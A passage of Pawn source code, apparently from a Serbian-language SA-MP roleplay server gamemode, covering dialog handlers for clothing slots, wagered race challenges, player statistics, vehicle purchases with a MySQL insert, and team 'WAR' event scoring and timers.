						case 1: { if( clothes_info[ playerid ][ x_slot_2_model ] == -1 ) return SendErrorMessage( playerid, "Nemate objekat u slotu 2." ); }
						case 2: { if( clothes_info[ playerid ][ x_slot_3_model ] == -1 ) return SendErrorMessage( playerid, "Nemate objekat u slotu 3." ); }
						case 3: { if( clothes_info[ playerid ][ x_slot_4_model ] == -1 ) return SendErrorMessage( playerid, "Nemate objekat u slotu 4." ); }
					}

        			if( object_on_player[ playerid ][ slot-1 ] ) return SendErrorMessage( playerid, "Prvo moras da skines objekt sa sebe sa slota %d", slot );

        			switch( (slot-1) )
					{
        			    case 0:
						{
		        			clothes_info[ playerid ][ x_slot_1_model ] = -1;
		        			for( new i = 0; i < 9; i ++ )
							{
							    clothes_info[ playerid ][ x_slot_1_pos ][ i ] = 0;
							}
        			    }
        			    case 1:
						{
							clothes_info[ playerid ][ x_slot_2_model ] = -1;
							for( new i = 0; i < 9; i ++ )
							{
							    clothes_info[ playerid ][ x_slot_2_pos ][ i ] = 0;
							}
						}
						case 2:
						{
							clothes_info[ playerid ][ x_slot_3_model ] = -1;
							for( new i = 0; i < 9; i ++ )
							{
							    clothes_info[ playerid ][ x_slot_3_pos ][ i ] = 0;
							}
						}
						case 3:
						{
							clothes_info[ playerid ][ x_slot_4_model ] = -1;
							for( new i = 0; i < 9; i ++ )
							{
							    clothes_info[ playerid ][ x_slot_4_pos ][ i ] = 0;
							}
        			    }
					}
					SendInfoMessage( playerid, "Bacili ste objekt sa slota %d u kontejner, nemate ga vise u statsima.", slot );
	            }
	        }
	    }
	}
	else if(dialogid == dialog_IGRAONICA )
	{
		if( !response ) return 1;
	    if( response )
		{
	        switch( listitem )
			{
	            case 0:
				{
			        if( uInterijeru[ playerid ] != Interiors[5] ) return SendErrorMessage( playerid, "Moras biti u igraonici." );

	                if( PljackaUToku || ZlataraUToku ) return SendErrorMessage( playerid, "Ne mozete ovo dok je pljacka u toku." );
			        if( PlayerInfo[ playerid ][ xLevel ] < 2 ) return SendErrorMessage( playerid, "Ne mozes ako nisi level 2+." );

			        if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na izazov dok imate wanted.");
		    		if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na izazov dok ste u jailu / prisonu.");

		    		if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes na izazov dok si cuffovan." );
		    		if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na izazov dok si vezan." );

					tdmTDControl( playerid, true );
				}
	            case 1:
				{
					if( PosaoVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano poslovno vozilo, ponistite posao pa pokrenite trku.");
					if( RentVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano rent vozilo, ponistite rent pa pokrenite trku.");
					if( AdminVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano A/GM vozilo, unistite ga pa pokrenite trku.");
					if( VipVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano V/T vozilo, unistite ga pa pokrenite trku.");
					if( PromoterVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano Promoter vozilo, unistite ga pa pokrenite trku.");
					if( YTVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano YT vozilo, unistite ga pa pokrenite trku.");
	                ShowPlayerDialog( playerid, dialog_NFSIZAZOVI, DIALOG_STYLE_INPUT, "{FFFFFF}Izazovite na trku:", "{FFFFFF}* Unesite ID igraca, zatim broj iz ponude i ulog.\n[Broj] 1. Sultan 2. Infernus 3. Bullet 4. Elegy 5. Turismo\n[Broj] 6. Quad 7. Sabre 8. Hotring Racer 9. NRG-500 10. Tractor\n[Ulog] Ukoliko je ulog 0, igracete bez uloga\n\nPrimer: 25 4 1320", "U redu", "Izadji" );
				}
	        }
	    }
	}
	else if(dialogid == dialog_OFFSELLVEH )
	{
	    if( response )
		{
	        new veh_id = VehicleOffSaleVehID[ playerid ];

	        sql_vehicles_delete(veh_id);
			SendInfoMessage( playerid, "Uspesno ste obrisali vozilo." );
	    }
	    else
		{
			SendInfoMessage( playerid, "Odustali ste od brisanja vozila." );
	    }
	}
	else if(dialogid == dialog_NFSIZAZOVI )
	{
	    if( !response ) return 1;
	    if( response )
		{
	        new id, broj, model, ulog;
		    if( sscanf( inputtext, "uii", id, broj, ulog ) )
			{
		        ShowPlayerDialog( playerid, dialog_NFSIZAZOVI, DIALOG_STYLE_INPUT, "{FFFFFF}Izazovite na trku:", "{FFFFFF}* Unesite ID igraca, zatim broj iz ponude i ulog.\n[Broj] 1. Sultan 2. Infernus 3. Bullet 4. Elegy 5. Turismo\n[Broj] 6. Quad 7. Sabre 8. Hotring Racer 9. NRG-500 10. Tractor\n[Ulog] Ukoliko je ulog 0, igracete bez uloga\n\nPrimer: 25 4 1320", "U redu", "Izadji" );
		        return 1;
			}

			if( PljackaUToku || ZlataraUToku ) return SendErrorMessage( playerid, "Ne mozete ovo dok je pljacka u toku." );

			if( ( PlayerInfo[ playerid ][ xAdmin ] > 0 && PlayerInfo[ playerid ][ xAdmin ] < 4 ) || PlayerInfo[ playerid ][ xGamemaster ] > 0 || PlayerInfo[ playerid ][ xSpecAdmin ] > 0 )
			{
			    new hour, minute, second;
				gettimeEx( hour, minute, second );
				FixHour( hour );
				hour = shifthour;

				if( ( hour >= 00 ) && ( hour <= 08 ) ) { }
				else return SendErrorMessage( playerid, "Admin(1-3)/Gamemaster moze na trku samo od 00h do 08h." );
			}

			if( id == IPI ) return SendErrorMessage( playerid, "Pogresan id igraca." );
			if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebe da izazoves." );
			if( uInterijeru[ playerid ] != Interiors[5] ) return SendErrorMessage( playerid, "Moras biti u igraonici." );
			if( uInterijeru[ id ] != Interiors[5] ) return SendErrorMessage( playerid, "Taj igrac mora biti u igraonici." );
			if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Vec si na trci." );
		    if( NaUtrci[ id ] ) return SendErrorMessage( playerid, "Igrac je vec na trci." );
		    if( PljackaNovac[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da ides na trku dok si u toku pljacke." );
		    if( PljackaNovac[ id ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da invite igraca koji je u toku pljacke." );
		    if( PljackaZlato[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da ides na trku dok si u toku pljacke." );
		    if( PljackaZlato[ id ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da invite igraca koji je u toku pljacke." );
			if( broj < 1 || broj > 10 ) return SendErrorMessage( playerid, "Broj moze ici od 1 do 10." );
			if( ulog < 0 ) return SendErrorMessage( playerid, "Ulog ne moze biti manji od 0." );
			if( PlayerInfo[ playerid ][ xLevel ] < 2) return SendErrorMessage( playerid, "Ne mozes ako nisi level 2+." );
			if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes na izazov dok si cuffovan." );
		    if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na izazov dok si vezan." );
			if( IsPlayerInAnyVehicle( playerid )  ) return SendErrorMessage( playerid, "Morate biti na nogamo da bi otisli na izazov." );
			if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogamo da bi otisli na izazov." );
			//if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru." );
			//if( GetPlayerVirtualWorld( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru/vwu." );
			if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na izazov dok imate wanted.");
		    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na izazov dok ste u jailu / prisonu.");
		    if( PlayerInfo[ playerid ][ xNovac ] < ulog ) return SendErrorMessage( playerid, "Nemate dovoljno novca za ulog." );
		    if( PlayerInfo[ id ][ xNovac ] < ulog ) return SendErrorMessage( playerid, "Taj igrac nema dovoljno novca." );
		    if( PlayerInfo[ id ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Taj igrac ima WL." );

			if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SendClientMessage( playerid, ANTICHEAT, "(ANTICHEAT): Nemoguce je trenutno otici na izazov, limit vozila na serveru je dosegnut.");

			switch( broj )
			{
			    case 1: model = 560;
			    case 2: model = 411;
			    case 3: model = 541;
			    case 4: model = 562;
			    case 5: model = 451;
			    case 6: model = 471;
			    case 7: model = 475;
			    case 8: model = 502;
			    case 9: model = 522;
			    case 10: model = 531;
			}

			PonudioIgrac[ id ] = playerid;
			PonudioIgrac[ playerid ] = id;
			UlogTrke[ id ] = ulog;
			UlogTrke[ playerid ] = ulog;

		    ModelTrke[ id ] = model;

		    new string[ 200 ];
			format( string, sizeof( string ), "{FFFFFF}* Igrac %s vas je izazvao na trku sa %s.\nUlog trke je $%d\n\nDa prihvatis pretisni na 'Prihvati'.\nDa odustanes pritisni na 'Odustani'", ImeIgraca( playerid ), GetVehicleNameEx( model ), ulog );

		    ShowPlayerDialog( id, dialog_IZAZOVITRKA, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "Potvrdi", "Odustani" );

		    SendInfoMessage( playerid, "Izazvali ste na trku %s.", ImeIgraca( id ) );
	    }
	}
	else if(dialogid == dialog_USLOVIKORISCENJA )
	{
	    if( response ) 
	    {
	        Register_2(playerid);
	    }
	    else
	    {
	        Kickovanje( playerid, "Ne slazete se sa nasim uslovima!");
	    }
	}
	else if(dialogid == dialog_STATISTIKAIGRACA )
	{
	    if( !response ) { playerStatsTargetID[ playerid ] = -1; return 1; }
	    if( response )
		{
	        if( playerStatsPage[ playerid ] == 0 )
			{
                playerStatsPage[ playerid ]++;

	            new targetid = playerStatsTargetID[ playerid ];

	            new str[ 1024 ];

	            strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	            format( globalstring, sizeof( globalstring ), "{4282C0}- {FFFFFF}%s {4282C0}| {FFFFFF}Event i igraonica:\n\n", ImeIgraca( targetid ) );
				strcat( DialogStrgEx, globalstring );

				format( globalstring, sizeof( globalstring ), "{4282C0}Osvojena 1 mesta: {FFFFFF}(%s)\n", fNumber(PlayerInfo[ targetid ][ xEvent1Mesto ]));
				strcat( DialogStrgEx, globalstring );
				format( globalstring, sizeof( globalstring ), "{4282C0}Osvojena 2 mesta: {FFFFFF}(%s)\n", fNumber(PlayerInfo[ targetid ][ xEvent2Mesto ]));
				strcat( DialogStrgEx, globalstring );
				format( globalstring, sizeof( globalstring ), "{4282C0}Osvojena 3 mesta: {FFFFFF}(%s)\n", fNumber(PlayerInfo[ targetid ][ xEvent3Mesto ]));
				strcat( DialogStrgEx, globalstring );
				format( globalstring, sizeof( globalstring ), "{4282C0}Ubistva u CS-DM: {FFFFFF}(%s)\n", fNumber(PlayerInfo[ targetid ][ xDMEventUbistva ]));
				strcat( DialogStrgEx, globalstring );
				format( globalstring, sizeof( globalstring ), "{4282C0}Ubistva u CS-TDM: {FFFFFF}(%s)\n\n", fNumber(PlayerInfo[ targetid ][ xCSTDMScore ]));
				strcat( DialogStrgEx, globalstring );

				if(PlayerInfo[ targetid ][ xSlotoviVozila ] < 4)
    			{
					format( globalstring, sizeof( globalstring ), "{4282C0}- Vozila [slotovi: {FFFFFF}(%d/%d){4282C0}]:\n", PlayerInfo[ targetid ][ xSlotoviVozila ], MAX_VEH_SLOT );
					strcat( DialogStrgEx, globalstring );

					for( new j = 0; j < MAX_VEH_SLOT; j++ )
					{
					    if( (j+1) <= PlayerInfo[ targetid ][ xSlotoviVozila ] )
						{
							if( player_veh[ targetid ][ vehicle_id ][ j ] != -1 )
							{
								format( str, sizeof( str ), "{4282C0}* Slot{FFFFFF}(%d) {4282C0}| Marka: {FFFFFF}%s {4282C0}| InGame ID: {FFFFFF}(%d) {4282C0}| SQL ID: {4282C0}(%d)\n",
										j+1,
										getVehicleName( player_veh[ targetid ][ vehicle_id ][ j ] ),
										player_veh[ targetid ][ vehicle_id ][ j ],
										VehicleInfo[ player_veh[ targetid ][ vehicle_id ][ j ] ][ vSqlID ] );

								strcat( DialogStrgEx, str );
							}
							else
							{
							    format( globalstring, sizeof( globalstring ), "{4282C0}* Slot{FFFFFF}(%d) {4282C0}| PRAZNO\n", j+1 );
						        strcat( DialogStrgEx, globalstring );
							}
						}
					}
				}
				else
				{
	    			strcat( DialogStrgEx, "{4282C0}- Imate vise od 3 slota za vozila, koristite {FFFFFF}[ /carstats ] {4282C0}da vidite vasa vozila." );
				}

				strcat( DialogStrgEx, "\n\n" );
				strcat( DialogStrgEx, "{4282C0}- Nepokretna imovina:\n" );
				for( new j = 0; j < 3; j ++ )
				{
				    if( PlayerInfo[ targetid ][ xProperty ][ j ] != -1 )
					{
				        format( str, sizeof( str ), "{4282C0}* Slot{FFFFFF}(%d) {4282C0}| Vrsta: {FFFFFF}(%s) {4282C0}| ID: {FFFFFF}(%d)\n",
							j+1,
							GetPropertyAName( PlayerInfo[ targetid ][ xProperty ][ j ] ),
							PlayerInfo[ targetid ][ xProperty ][ j ] );

						strcat( DialogStrgEx, str );
				    }
				    else
					{
				        format( globalstring, sizeof( globalstring ), "{4282C0}* Slot{FFFFFF}(%d) {4282C0}| PRAZNO\n", j+1 );
				        strcat( DialogStrgEx, globalstring );
				    }
				}
				if( PlayerInfo[ targetid ][ xFirmaID ] == -1 )
				{
					strcat( DialogStrgEx, "{4282C0}Firma: {FFFFFF}(-1)\n" );
				}
				else
				{
				    format( str, sizeof( str ), "{4282C0}Firma: {FFFFFF}%s {4282C0}| ID: {FFFFFF}(%d)\n",
					BusinessInfo[ PlayerInfo[ targetid ][ xFirmaID ] ][ bName ], PlayerInfo[ targetid ][ xFirmaID ] );
					strcat( DialogStrgEx, str );
				}

				new year, month,day, tmphour, tmpminute, tmpsecond;
				getdate( year, month, day );
				gettimeEx( tmphour, tmpminute, tmpsecond );
				FixHour( tmphour );
				tmphour = shifthour;
			   	format( str, sizeof( str ), "						%02d/%02d/%d - %s%d:%s%d:%s%d", day, month, year, (tmphour < 10) ? ("0") : (""), tmphour, (tmpminute < 10) ? ("0") : (""), tmpminute, (tmpsecond < 10) ? ("0") : (""), tmpsecond );
		        strcat( DialogStrgEx, str );


	            ShowPlayerDialog( playerid, dialog_STATISTIKAIGRACA, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "Nazad", "Zatvori" );
    			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	        }
	        else ShowDialogStats( playerid, playerStatsTargetID[ playerid ] );
	    }
	}
	else if(dialogid == dialog_VEHMONEYBUY )
	{
	    if( response )
		{
			    if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Morate biti level 5+ da bi ste kupili vozilo." );
			    if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SendClientMessage( playerid, ANTICHEAT, "[ANTICHEAT]: Nemoguce je trenutno kupiti vozilo, limit vozila na serveru je dosegnut.");
			    if( PlayerInfo[ playerid ][ xNovac ] < SalonVozila[as_Model[playerid]][vPrice] ) return SendErrorMessage( playerid, "Nemas dovoljno novca." );
                if( carspawntimer == 1 ) return SCMF( playerid, ANTICHEAT, "(ANTICHEAT): Neko je kupio/parkirao vozilo pre vas. Pokusajte za 3 sekunde. (Anticrash)");

				new slot = -1;
                for( new j = 0; j < MAX_VEH_SLOT; j ++ )
				{
	                if( (j+1) <= PlayerInfo[ playerid ][ xSlotoviVozila ] && player_veh[ playerid ][ vehicle_id ][ j ] == -1 )
					{
	                    slot = j;
						break;
					}
				}
				if( slot == -1 ) return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );

				new i = IVI;
				if(IsVehicleLetelicaAS(SalonVozila[as_Model[playerid]][vID]))
				{
                	i = SMG_CreateVehicle(SalonVozila[as_Model[playerid]][vID], 2070.7463, -2542.3342, 13.3528 + 1.0, 2.2305, random(129), random(129), 300000);
					VehicleInfo[ i ][ vLokacijaX ] = 2070.7463;
					VehicleInfo[ i ][ vLokacijaY ] = -2542.3342;
					VehicleInfo[ i ][ vLokacijaZ ] = 13.3528;
					VehicleInfo[ i ][ vLokacijaA ] = 2.2305;
                }
                else if(IsVehicleBrodAS(SalonVozila[as_Model[playerid]][vID]))
                {
                	i = SMG_CreateVehicle(SalonVozila[as_Model[playerid]][vID], 241.0585, -1910.9041, -0.5449 + 1.0, 184.8918, random(129), random(129), 300000);
                	VehicleInfo[ i ][ vLokacijaX ] = 241.0585;
					VehicleInfo[ i ][ vLokacijaY ] = -1910.9041;
					VehicleInfo[ i ][ vLokacijaZ ] = -0.5449;
					VehicleInfo[ i ][ vLokacijaA ] = 184.8918;
                }
                else
                {
                	i = SMG_CreateVehicle(SalonVozila[as_Model[playerid]][vID], 527.4365, -1288.6925, 17.0487 + 1.0, 359.6790, random(129), random(129), 300000);
                	VehicleInfo[ i ][ vLokacijaX ] = 527.4365;
					VehicleInfo[ i ][ vLokacijaY ] = -1288.6925;
					VehicleInfo[ i ][ vLokacijaZ ] = 17.0487;
					VehicleInfo[ i ][ vLokacijaA ] = 359.6790;
                }
				VehicleInfo[ i ][ vOwner_sqlID ] = PlayerInfo[ playerid ][ xID ];

				strmid( VehicleInfo[ i ][ vOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 32);

				VehicleInfo[ i ][ vPrice ] = SalonVozila[as_Model[playerid]][vPrice];
				VehicleInfo[ i ][ v_owner_id ] = playerid;
				VehicleInfo[ i ][ vLocked ] = 0;
				VehicleInfo[ i ][ vVirtualWorld ] = 0;
				VehicleInfo[ i ][ vInterior ] = 0;
				VehicleInfo[ i ][ vUsage ] = PRIVATNO_VOZILO;
				VehicleInfo[ i ][ vOrganizationSQLID ] = 0;
				VehicleInfo[ i ][ vOrganization ] = -1;
				VehicleInfo[ i ][ vColor1 ] = 0;
				VehicleInfo[ i ][ vColor2 ] = 0;
				VehicleInfo[ i ][ vModel ] = SalonVozila[as_Model[playerid]][vID];
				VehicleInfo[ i ][ vReg ] = 0;
				VehicleInfo[ i ][ vRegVreme ] = 0;
				VehicleInfo[ i ][ vTeh ] = 0;
				VehicleInfo[ i ][ vOsiguranje ] = 5;
				VehicleInfo[ i ][ vLock ] = 0;
				VehicleInfo[ i ][ vAlarm ] = 0;
				VehicleInfo[ i ][ vTuned ] = 0;
				VehicleInfo[ i ][ vNeon ] = 0;
				VehicleInfo[ i ][ vImobilizator ] = 0;
				VehicleInfo[ i ][ vSpoiler ] = 0;
				VehicleInfo[ i ][ vHood ] = 0;
				VehicleInfo[ i ][ vRoof ] = 0;
				VehicleInfo[ i ][ vSkirt ] = 0;
				VehicleInfo[ i ][ vLamps ] = 0;
				VehicleInfo[ i ][ vNitro ] = 0;
				VehicleInfo[ i ][ vExhaust ] = 0;
				VehicleInfo[ i ][ vWheels ] = 0;
				VehicleInfo[ i ][ vStereo ] = 0;
				VehicleInfo[ i ][ vHydraulics ] = 0;
				VehicleInfo[ i ][ vFrontBumper ] = 0;
				VehicleInfo[ i ][ vRearBumper ] = 0;
				VehicleInfo[ i ][ vVents ] = 0;
				VehicleInfo[ i ][ vPaintJob ] = 255;
				VehicleInfo[ i ][ vMaterijali ] = 0;
				VehicleInfo[ i ][ vDrugAmmount ] = 0;
		        VehicleInfo[ i ][ vMelee ] = 0; VehicleInfo[ i ][ vWeap1 ] = 0; VehicleInfo[ i ][ vAmmo1 ] = 0; VehicleInfo[ i ][ vWeap2 ] = 0; VehicleInfo[ i ][ vAmmo2 ] = 0;

                LinkVehicleToInterior( i, VehicleInfo[ i ][ vInterior ] );
                SetVehicleVirtualWorld( i, VehicleInfo[ i ][ vVirtualWorld ] );

				vCanDrive[ i ] = 1;
				SetVehicleNumberPlate( i, "NEMA" ); 
				UnLockCar( i );

		        carspawntimer = 1;
				ResetVehicleStatistics( i );
		     	SetTimer_("AntiSpawnCrash", 3000, 3000, 1);

				new query[ 1024 ];
			    mysql_format( mSQL, query, sizeof( query ),
					"INSERT INTO `vehicles` (owner_sqlID, v_price, v_pos_x, v_pos_y, v_pos_z, v_pos_a, v_virtualw, v_interior, v_usage, v_organization, v_color_1, v_color_2, v_model) \
			  		VALUES( '%d', '%d', '%f', '%f', '%f', '%f', '%d', '%d', '%d', '%d', '%d', '%d', '%d' )",
					    PlayerInfo[playerid][xID], VehicleInfo[ i ][ vPrice ], VehicleInfo[ i ][ vLokacijaX ], VehicleInfo[ i ][ vLokacijaY ], VehicleInfo[ i ][ vLokacijaZ ],
						VehicleInfo[ i ][ vLokacijaA ], VehicleInfo[ i ][ vVirtualWorld ], VehicleInfo[ i ][ vInterior ],
						VehicleInfo[ i ][ vUsage ], VehicleInfo[ i ][ vOrganizationSQLID ],
						VehicleInfo[ i ][ vColor1 ], VehicleInfo[ i ][ vColor2 ], VehicleInfo[ i ][ vModel ] );

				mysql_tquery( mSQL, query, "OnVehicleCreate", "i", i);

				SetVehicleParamsEx( i, 0, 0, 0, VehicleInfo[ i ][ vLocked ], 0, 0, 0 );
		        if( IsVehicleBajs( i ) )
				{
					SetVehicleParamsEx( i, 1, 0, 0, VehicleInfo[ i ][ vLocked ], 0, 0, 0 );
				}

		   		DajIgracuNovac( playerid, -SalonVozila[as_Model[playerid]][vPrice] );

				for( new j = 0; j < MAX_VEH_SLOT; j ++ )
				{
	                if( (j+1) <= PlayerInfo[ playerid ][ xSlotoviVozila ] && player_veh[ playerid ][ vehicle_id ][ j ] == -1 )
					{
						player_veh[ playerid ][ vehicle_id ][ j ] = i;
						break;
					}
				}

				WriteLog("log-kupovina", "Igrac %s je kupio vozilo %s u salonu", ImeIgraca( playerid ), SalonVozila[as_Model[playerid]][vName]);

			  	as_Buying[ playerid ] = false;
				as_Model[ playerid ] = 0;

				ControlTextDrawVehBuy( playerid, false );
				TogPlayerHud( playerid );
				SMG_TogglePlayerControllable( playerid, true );

				SetCameraBehindPlayer( playerid );
		   		SendInfoMessage( playerid, "Uspesno ste kupili vozilo, oznaceno vam je na radaru markerom." );

		   		if(questInfo[playerid][qt_EasyQuest][5] == false) {
		   			questInfo[playerid][qt_EasyQuest][5] = true;
		   			sql_UpdateQuest(playerid);

					KillTimer(QuestTimer[playerid]);
					quest_CreateTDs(playerid, false);

					quest_CreateTDs(playerid, true);
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "CESTITAMO, RIJESILI STE ~p~ZADATAK BR.6");
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "Nagradu mozete preuzeti~n~~p~(/zadaci pocetni)");

					QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 1);
		   		}
		     	SMG_SetPlayerCheckpoint( playerid, VehicleInfo[ i ][ vLokacijaX ], VehicleInfo[ i ][ vLokacijaY ], VehicleInfo[ i ][ vLokacijaZ ], 5.0 );
				CheckpointStatus[ playerid ] = 15;
			}
	}
	return 1;
}

_:public ZaustaviWAR( w )
{
    WARInfo[ w ][ WARAktivan ] = false;
    WARInfo[ w ][ WARKreiranje ] = false;

	KillTimer(WARInfo[ w ][ WARTimer ]);

	if( WARInfo[ w ][ WARTimSkor ][ 0 ] > WARInfo[ w ][ WARTimSkor ][ 1 ] )
	{
		DajIgracuNovac( WARInfo[ w ][ WARTimLider ][ 0 ], (WARInfo[ w ][ WARCena ]*2) );
	}

	if( WARInfo[ w ][ WARTimSkor ][ 1 ] > WARInfo[ w ][ WARTimSkor ][ 0 ] )
	{
		DajIgracuNovac( WARInfo[ w ][ WARTimLider ][ 1 ], (WARInfo[ w ][ WARCena ]*2) );
	}

	if( WARInfo[ w ][ WARTimSkor ][ 0 ] == WARInfo[ w ][ WARTimSkor ][ 1 ] )
	{
		DajIgracuNovac( WARInfo[ w ][ WARTimLider ][ 0 ], WARInfo[ w ][ WARCena ] );
		DajIgracuNovac( WARInfo[ w ][ WARTimLider ][ 1 ], WARInfo[ w ][ WARCena ] );
	}

	foreach( new i : Player)
	{
	    if( WARPInfo[ i ][ WARIgrac ] == w )
		{
            if( WARInfo[ w ][ WARTimSkor ][ 0 ] > WARInfo[ w ][ WARTimSkor ][ 1 ] )
			{
                if( WARPInfo[ i ][ WARTim ][ 0 ] )
				{
		  			SCMF( i, 0xFFAF00FF, "(WAR): Pobedili ste i vasa organizacija je dobila {FFFFFF}(%d).", (WARInfo[ w ][ WARCena ]*2) );
		  		}
			}

            if( WARInfo[ w ][ WARTimSkor ][ 1 ] > WARInfo[ w ][ WARTimSkor ][ 0 ] )
			{
                if( WARPInfo[ i ][ WARTim ][ 1 ] )
				{
		  	    	SCMF( i, 0xFFAF00FF, "(WAR): Pobedili ste i vasa organizacija je dobila {FFFFFF}(%d).", (WARInfo[ w ][ WARCena ]*2) );
				}
			}

  		    SCMF( i, 0xFFAF00FF, "(WAR - TVOJ SCORE): Ubistva: {FFFFFF}(%d) {FFAF00}| Smrti: {FFFFFF}(%d)", WARPInfo[ i ][ WARUbistva ], WARPInfo[ i ][ WARSmrti ]);
  		    SCMF( i, 0xFFAF00FF, "(WAR - TIMOVI): Tim 1: {FFFFFF}%s {FFAF00}| Tim 2: {FFFFFF}%s", getOrgName( WARInfo[ w ][ WARTeamID ][ 0 ] ), getOrgName( WARInfo[ w ][ WARTeamID ][ 1 ] ) );
  		    SCMF( i, 0xFFAF00FF, "(WAR - FINISH): Tim 1: {FFAF00}(%d) {FFAF00}| Tim 2: {FFFFFF}(%d)", WARInfo[ w ][ WARTimSkor ][ 0 ], WARInfo[ w ][ WARTimSkor ][ 1 ] );

	        SetPlayerHealth( i, 100 );
	        SetPlayerArmour( i, 0 );

	        SMG_SetPlayerPos( i, PozicijaWAR[ i ][ 0 ], PozicijaWAR[ i ][ 1 ],  PozicijaWAR[ i ][ 2 ] );
	        SetPlayerVirtualWorld( i, VirtualWWAR[ i ] );
	        SetPlayerInterior( i, InteriorWAR[ i ] );

			ResetPlayerWeapons( i );

            WARPInfo[ i ][ WARIgrac ] = -1;

	        ResetujWarIgraca( i );

	        WarTDControl( i, false );
		}
	}

	WARInfo[ w ][ WARCena ] = 0;
	WARInfo[ w ][ WARMaxClanova ] = 0;
	WARInfo[ w ][ WARTimClanovi ][ 0 ] = 0;
    WARInfo[ w ][ WARTimClanovi ][ 1 ] = 0;
    WARInfo[ w ][ WARTimSkor ][ 0 ] = 0;
    WARInfo[ w ][ WARTimSkor ][ 1 ] = 0;
    WARInfo[ w ][ WARTeamID ][ 0 ] = -1;
    WARInfo[ w ][ WARTeamID ][ 1 ] = -1;
	return 1;
}

_:public TimerWAROstaloVremeB( w )
{
    if( WARInfo[ w ][ WARAktivan ] == false )
	{
		WARInfo[ w ][ TimerWARMin ] = 1;
		WARInfo[ w ][ TimerWARSec ] = 0;
		KillTimer(WARInfo[ w ][ TimerWAROstaloVreme ]);
	}
    WARInfo[ w ][ TimerWARSec ]++;

    if( WARInfo[ w ][ TimerWARSec ] == 60 )
	{
		WARInfo[ w ][ TimerWARMin ]++;
		WARInfo[ w ][ TimerWARSec ] = 0;
	}

    foreach( new i : Player)
	{
        if( WARPInfo[ i ][WARIgrac] == w )
		{
            new vreme_string[ 25 ];
		    if( WARInfo[ w ][ TimerWARSec ] >= 51 )
			{
           		format( vreme_string, sizeof( vreme_string ), "war_::_(%d:0%d)", 10*60000/60000 - WARInfo[ w ][ TimerWARMin ], 10*60000/10000 - WARInfo[ w ][ TimerWARSec ] );
		    }
		    else if( WARInfo[ w ][ TimerWARMin ] >= 6 )
			{
           		format( vreme_string, sizeof( vreme_string ), "war_::_(0%d:%d)", 10*60000/60000 - WARInfo[ w ][ TimerWARMin ], 10*60000/10000 - WARInfo[ w ][ TimerWARSec ] );
		    }
			else if( WARInfo[ w ][ TimerWARSec ] >= 51 && WARInfo[ w ][ TimerWARMin ] >= 6)
			{
           		format( vreme_string, sizeof( vreme_string ), "war_::_(0%d:0%d)", 10*60000/60000 - WARInfo[ w ][ TimerWARMin ], 10*60000/10000 - WARInfo[ w ][ TimerWARSec ] );
			}
			else
			{
           		format( vreme_string, sizeof( vreme_string ), "war_::_(%d:%d)", 10*60000/60000 - WARInfo[ w ][ TimerWARMin ], 10*60000/10000 - WARInfo[ w ][ TimerWARSec ] );
			}
			PlayerTextDrawSetString( i, WAR_pTD[ i ][ 14 ],  vreme_string );
    	}
    }
    return 1;
}

GetNearestGift(playerid) 
{
	new Float:p_Pos[3], Float:maxradius = 2.0, id = -1;
	GetPlayerPos(playerid, p_Pos[0], p_Pos[1], p_Pos[2]);

    foreach(new i : iter_Gift)
    {
        if(VectorSize(p_Pos[0] - GiftInfo[i][gPosX], p_Pos[1] - GiftInfo[i][gPosY], p_Pos[2] - GiftInfo[i][gPosZ]) >= maxradius) continue;

        id = i;
        maxradius = VectorSize(p_Pos[0] - GiftInfo[i][gPosX], p_Pos[1] - GiftInfo[i][gPosY], p_Pos[2] - GiftInfo[i][gPosZ]);
    }
    return id;
}

_:public GetPlayerIdFromName( const playername[] )
{
	foreach( new i : Player)
	{
		new playername2[ MAX_PLAYER_NAME ];
		format( playername2, sizeof( playername2 ), "%s", ImeIgraca( i ) );
		if( strcmp( playername2, playername, true, strlen( playername) ) == 0 )
		{
			return i;
		}
	}
	return IPI;
}

_:public countStatistic(playerid, count)
{
	CountStatistic = 0;
	switch(count)
	{
		case 0:
		{
		    new rows,
		    	fields,
		    	admin_lvl,
		    	agmstats,
